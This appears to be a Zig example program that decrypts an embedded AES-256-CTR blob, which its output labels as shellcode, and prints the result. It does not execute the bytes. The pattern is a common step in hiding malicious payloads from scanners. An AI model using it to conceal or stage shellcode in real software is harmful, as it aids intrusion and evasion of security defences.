const std = @import("std");

const AES_KEY: [32]u8 = [_]u8{
    0xed, 0x09, 0x69, 0xdf, 0xfb, 0x74, 0x33, 0x69, 0x6f, 0x3d, 0xf0, 0x97, 0x8e, 0x5d, 0x9c, 0x7d, 
    0x1e, 0xf8, 0xe4, 0x1b, 0xed, 0x25, 0xab, 0x9b, 0x41, 0xe7, 0x01, 0x50, 0xd5, 0x60, 0x4f, 0x7d
};

const AES_IV: [16]u8 = [_]u8{
    0x58, 0xe6, 0x74, 0x97, 0xb3, 0x92, 0xe5, 0xdd, 0xac, 0xce, 0x6d, 0xf5, 0xb6, 0xaa, 0x23, 0x5e
};

const AES_CIPHERTEXT: [193]u8 = [_]u8{
    0x5e, 0xd0, 0x02, 0x60, 0x54, 0x1c, 0x04, 0x2d, 0x76, 0x42, 0x6d, 0x5a, 0x4d, 0xa6, 0xef, 0xa4, 
    0xff, 0x24, 0x14, 0x39, 0x3f, 0x4e, 0x1b, 0x1c, 0xb6, 0xd4, 0xa5, 0x7f, 0x11, 0x84, 0x33, 0x68, 
    0x16, 0xc7, 0x8f, 0x39, 0x09, 0x3b, 0xf8, 0x2c, 0xed, 0x45, 0x14, 0xd6, 0x07, 0x9a, 0x1e, 0x64, 
    0x99, 0x35, 0xf1, 0x73, 0xbe, 0xe5, 0x2f, 0xcb, 0x2f, 0x35, 0x1a, 0x83, 0xcc, 0x80, 0x19, 0x69, 
    0x58, 0xa1, 0x78, 0x12, 0x05, 0xc4, 0xa2, 0xdc, 0x56, 0xa7, 0xc8, 0xed, 0xff, 0x14, 0x0a, 0x17, 
    0xd1, 0x05, 0xbe, 0xe7, 0x07, 0x4a, 0xf1, 0x81, 0xff, 0x01, 0x5e, 0x54, 0x8c, 0x39, 0x62, 0xc4, 
    0xdb, 0x2f, 0x55, 0xf9, 0x57, 0x66, 0xa0, 0x7d, 0x5e, 0xb8, 0xa0, 0xd6, 0x9e, 0x3a, 0xa1, 0x60, 
    0xfb, 0xd1, 0x8e, 0x52, 0xa4, 0x76, 0x0d, 0x3e, 0xc5, 0x71, 0xcf, 0xe3, 0xd0, 0x2b, 0xdf, 0xb7, 
    0x79, 0x8a, 0xa4, 0x87, 0x05, 0x91, 0x39, 0x88, 0xd0, 0x55, 0x9c, 0x03, 0x9b, 0x8d, 0xab, 0xec, 
    0x20, 0x5d, 0x64, 0x90, 0x80, 0x2f, 0xf1, 0x96, 0x80, 0x9e, 0xc2, 0xe5, 0xcd, 0x49, 0x73, 0xf7, 
    0xc5, 0xdf, 0x38, 0xd5, 0x0e, 0xc8, 0x6e, 0xb8, 0x2f, 0x80, 0x8c, 0x2d, 0x6d, 0xea, 0x1b, 0x2d, 
    0x48, 0xd5, 0x3a, 0x12, 0xd1, 0x9d, 0x3d, 0xb4, 0x72, 0x22, 0xcd, 0x4e, 0xdf, 0x58, 0x4f, 0xcc, 
    0x32
};

fn aesDecryption(ciphertext: []u8, key: []const u8, iv: []const u8) !void {
    switch (key.len) {
        16 => {
            const key_array: [16]u8 = key[0..16].*;
            const ctx = std.crypto.core.aes.Aes128.initEnc(key_array);
            try aesDecryptWithContext(ciphertext, ctx, iv);
        },
        32 => {
            const key_array: [32]u8 = key[0..32].*;
            const ctx = std.crypto.core.aes.Aes256.initEnc(key_array);
            try aesDecryptWithContext(ciphertext, ctx, iv);
        },
        else => return error.InvalidKeyLength,
    }
}

fn aesDecryptWithContext(data: []u8, ctx: anytype, iv: []const u8) !void {
    // CTR mode decryption is same as encryption
    var counter: [16]u8 = undefined;
    @memcpy(&counter, iv);

    var offset: usize = 0;
    while (offset < data.len) {
        var keystream: [16]u8 = undefined;
        ctx.encrypt(&keystream, &counter);

        const block_size = @min(16, data.len - offset);
        for (0..block_size) |i| {
            data[offset + i] ^= keystream[i];
        }

        // Increment counter
        var carry: u16 = 1;
        var i: usize = 15;
        while (carry > 0 and i < 16) {
            carry += counter[i];
            counter[i] = @intCast(carry & 0xFF);
            carry >>= 8;
            if (i == 0) break;
            i -= 1;
        }

        offset += block_size;
    }
}

pub fn main() !void {
    var ciphertext = AES_CIPHERTEXT;
    try aesDecryption(&ciphertext, &AES_KEY, &AES_IV);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});
}
